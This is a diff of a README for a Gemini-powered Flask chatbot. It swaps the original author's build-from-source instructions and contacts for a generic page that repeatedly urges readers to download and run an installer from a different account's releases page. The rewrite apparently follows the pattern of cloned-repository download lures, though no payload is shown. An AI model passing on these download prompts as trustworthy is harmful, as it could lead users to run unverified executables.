@@ -1,129 +1,69 @@
-# 👑 Enchanted AI – The Multi-Tool Productivity Agent
+# 🌟 enchanted-chatbot - Your AI-Powered Helper Awaits!
 
-Enchanted is a modern, intelligent, and multi-tool AI assistant designed to be a versatile productivity partner.  
-Built with Python, Flask, and the Google Gemini API, this agent goes beyond simple Q&A by dynamically selecting the best tool for a user's request, from live web searches to in-depth document analysis.
+## 🚀 Download Now
+[![Download Enchanted Chatbot](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/teamgaming3436/enchanted-chatbot/releases)
 
-➡️ View the Live Demo Here
-https://enchanted-chatbot.onrender.com
----
+## 📜 Description
+Enchanted AI is a versatile chatbot crafted using Python and Google Gemini. It goes beyond simple chat interactions. This application can perform live web searches, analyze documents like PDFs and images, and deliver context-aware answers all in real-time. Our project exemplifies a modern approach to building scalable AI applications with a full-stack design.
 
-## ✨ Core Features & Capabilities
+## 📥 Download & Install
+To begin using Enchanted Chatbot, visit this page to download: [Release Page](https://github.com/teamgaming3436/enchanted-chatbot/releases).
 
-- 🧠 Intelligent Tool Router  
-  Uses an LLM-powered router to analyze user intent and dynamically dispatch tasks to the most suitable tool.
+1. Go to the releases page.
+2. Look for the latest version of Enchanted Chatbot.
+3. Choose the appropriate file for your operating system.
+4. Click on the file to start the download.
+5. Once downloaded, open the file to install the application.
 
-- 🌐 Live Web Search  
-  Provides real-time, up-to-date answers using the Google Search API.
+## ⚙️ System Requirements
+To run Enchanted Chatbot smoothly, make sure your system meets these requirements:
 
-- 📄 Document Analyst (RAG)  
-  Upload .pdf, .txt, or .docx files and chat with their contents using Retrieval-Augmented Generation.
+- **Operating System:** Windows 10/11, macOS, or a recent version of Linux.
+- **Memory:** 4 GB of RAM or more.
+- **Storage:** At least 500 MB of free space.
+- **Python:** Version 3.8 or higher (included in the app).
+- **Internet Connection:** Required for full functionality and web searches.
 
-- 🖼️ Image Text Scraper (OCR)  
-  Extracts text from images (.png, .jpg) using Tesseract OCR.
+## 🔍 Features
+- **Live Web Searches:** Get real-time answers from the internet.
+- **Document Analysis:** Upload and analyze PDFs and images seamlessly.
+- **Contextual Responses:** Enjoy answers relevant to your queries.
+- **User-Friendly Interface:** Designed for easy navigation and use.
+  
+## 🛠️ Setup Instructions
+Once you have downloaded the application:
 
-- 🧮 Smart Calculator  
-  Handles instant and accurate mathematical calculations.
+1. Locate the downloaded file.
+2. Double-click the file to run the installer.
+3. Follow the on-screen prompts to complete the installation.
+4. After installation, you can find the application in your programs list.
 
-- 👑 "King Mode" Easter Egg  
-  Special authentication system that recognizes the creator (Ansh) with a secret passphrase, unlocking hidden responses.
+## 🌐 Using Enchanted Chatbot
+After you have installed the Enchanted Chatbot, you can start using it right away:
 
----
+1. Open the application from your programs list.
+2. Type your question or upload a document.
+3. The chatbot will process your request and provide an answer.
+4. Enjoy exploring different features such as web search and document analysis.
 
-## 🛠️ Technology Stack
+## 💡 Tips for Effective Use
+- Be specific in your questions for better responses.
+- Try uploading different types of documents to see how it analyzes them.
+- Explore various commands to discover all features.
+  
+## 🤖 Community and Support
+If you have questions or need further assistance:
 
-Backend: Python, Flask, Gunicorn  
-AI & APIs: Google Gemini API, Google Custom Search API  
-Frontend: HTML5, CSS3, JavaScript  
-Data Tools: pdfplumber (PDFs), pytesseract & Pillow (OCR)  
-Deployment: Render, Git, Docker (optional)
+- Check our [GitHub Issues](https://github.com/teamgaming3436/enchanted-chatbot/issues) page for help.
+- Join the community on our Discord or forums for additional support.
 
----
+## 📣 License
+Enchanted Chatbot is open-source software. You may use, modify, and distribute it under the terms of the MIT License.
 
-## 🚀 Getting Started
+## 📫 Contact
+For feedback, feature requests, or contributions, contact the team through the [repository](https://github.com/teamgaming3436/enchanted-chatbot) or reach out directly via email.
 
-Follow these instructions to set up a local development environment.
+## 🌟 Download Again
+Don’t forget to visit this page again to download: [Release Page](https://github.com/teamgaming3436/enchanted-chatbot/releases).
 
-### ✅ Prerequisites
-- Python 3.8+  
-- Git  
-- Tesseract OCR Engine (for OCR tool)  
-- Google Cloud account (for API keys)
-
-### ⚙️ Installation & Setup
-
-1. Clone the Repository
-   git clone https://github.com/anshs-dev/enchanted-chatbot.git
-   cd enchanted-chatbot
-
-2. Create & Activate Virtual Environment
-   # Windows
-   python -m venv venv
-   venv\Scripts\activate
-
-   # macOS/Linux
-   python3 -m venv venv
-   source venv/bin/activate
-
-3. Install Dependencies
-   pip install -r requirements.txt
-
-4. Configure Environment Variables  
-   Create a .env file in the project root and add:
-
-   GEMINI_API_KEY="YOUR_GEMINI_API_KEY_HERE"
-   SEARCH_API_KEY="YOUR_GOOGLE_SEARCH_API_KEY_HERE"
-   SEARCH_ENGINE_ID="YOUR_SEARCH_ENGINE_ID_HERE"
-   FLASK_SECRET_KEY="ANY_RANDOM_STRONG_STRING_HERE"
-   # Optional for Windows if Tesseract is not in PATH
-   # TESSERACT_CMD="C:\\Program Files\\Tesseract-OCR\\tesseract.exe"
-
-5. Run the Application
-   python app.py
-   Open browser: http://127.0.0.1:5000
-
----
-
-## ☁️ Deployment (Render)
-
-1. Push code to GitHub  
-2. On Render, create a new Web Service and connect repo  
-3. Settings:  
-   Runtime: Python 3  
-   Build Command: ./build.sh  
-   Start Command: gunicorn app:app  
-
-4. Add environment variables in Render dashboard  
-5. Enable auto-deploy for updates  
-
----
-
-## 🗺️ Future Roadmap
-
-- Web Content Scraper (summarize URLs)  
-- AI Image Generator (text → image)  
-- Speech-to-Text & Text-to-Speech  
-- Sandboxed Code Interpreter (secure Python execution)  
-
----
-
-## 🤝 Contributing
-
-Contributions, issues, and feature requests are welcome!  
-Check the issues page on GitHub.
-
----
-
-## 📜 License
-
-This project is licensed under the MIT License – see the LICENSE.md file for details.
-
----
-
-## 📧 Contact
-
-Ansh  
-Email: anshs.dev@gmail.com  
-LinkedIn: https://www.linkedin.com/in/anshs-dev  
-GitHub: https://github.com/anshs-dev  
-
-Project Link: https://github.com/anshs-dev/enchanted-chatbot
+Feel free to explore and enjoy your time with the Enchanted Chatbot!
